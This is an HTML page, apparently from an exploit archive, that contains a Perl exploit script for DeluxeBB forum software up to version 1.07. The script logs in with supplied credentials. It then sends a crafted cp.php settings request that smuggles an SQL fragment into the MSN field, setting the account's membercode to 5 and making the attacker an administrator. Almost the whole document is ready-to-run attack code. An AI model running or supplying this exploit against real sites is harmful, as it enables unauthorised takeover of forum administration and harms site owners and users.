<html><head><title>DeluxeBB <= 1.07 (cp.php) Create Admin Exploit </title></head><pre>#!/usr/bin/perl
# DeluxeBB &lt;= 1.07 Create Admin Exploit
#
## www.h4ckerz.com / www.hackerz.ir / www.aria-security.net
# ./2006-6-25
### Coded &amp; Discovered By Hessam-x / Hessamx-at-Hessamx.net

use IO::Socket; 
use LWP::UserAgent;
use HTTP::Cookies;


 $host = $ARGV[0];
 $uname = $ARGV[1];
 $passwd = $ARGV[2];
 $url = &quot;http://&quot;.$host;
 
 print q(
 ###########################################################
 #          DeluxeBB &lt;= 1.07 Create Admin Exploit          # 
 #           www.hackerz.ir - www.h4ckerz.com              #
 ################### Coded By Hessam-x #####################

);


 
 if (@ARGV &lt; 3) {
 print &quot; #  usage : hx.pl [host&amp;path] [uname] [pass]\n&quot;; 
 print &quot; #  E.g : hx.pl www.milw0rm.com/deluxebb/ str0ke 123456\n&quot;; 
  exit();
 }
 
  
    print &quot; [~] User/Password : $uname/$passwd \n&quot;;
    print &quot; [~] Host : $host \n&quot;;
    print &quot; [~] Login ... &quot;;



 # Login In DeluxeBB &lt;= 1.07 Create Admin Exploit
 
 $xpl = LWP::UserAgent-&gt;new() or die;
 $cookie_jar = HTTP::Cookies-&gt;new();

 $xpl-&gt;cookie_jar( $cookie_jar );
 $res = $xpl-&gt;post($url.'misc.php',
 Content =&gt; [
 &quot;sub&quot; =&gt; &quot;login&quot;,
 &quot;name&quot; =&gt; &quot;$uname&quot;,
 &quot;password&quot; =&gt; &quot;$passwd&quot;,
 &quot;submit&quot; =&gt; &quot;Log-in&quot;,
 &quot;redirect&quot; =&gt; &quot;&quot;,
 &quot;expiry&quot; =&gt; &quot;990090909&quot;,
 ],);
 
  if($cookie_jar-&gt;as_string =~ /memberpw=(.*?);/) { 
  print &quot;successfully .\n&quot;;
  } else { 
  print &quot;UNsuccessfully !\n&quot;;
  print &quot; [-] Can not Login In $host !\n&quot;; 
  print $cookie_jar-&gt;as_string;
  exit(); 
  }

  # Creat Admin :)

$req = $xpl-&gt;get($url.'cp.php?sub=settings&amp;xemail=h4x0r@h4x0r.net&amp;xhideemail=0&amp;xmsn=h4x0r\',membercode=\'5&amp;xicq=&amp;xaim=&amp;xyim=&amp;xlocation=&amp;xsite=&amp;languagex=English&amp;skinx=default&amp;xthetimeoffset=0&amp;xthedateformat=d.m.y&amp;xthetimeformat=12&amp;invisiblebrowse=0&amp;markposts=15&amp;submit=Update');
$tst = $xpl-&gt;get($url.'index.php');
if ($tst-&gt;as_string =~ /Admin Cp/) { 
print &quot; [+] You Are Admin Now !!&quot;;
} else {
    print &quot; [-] Exploit Failed !&quot;;
    }

# milw0rm.com [2006-06-25]</pre></html>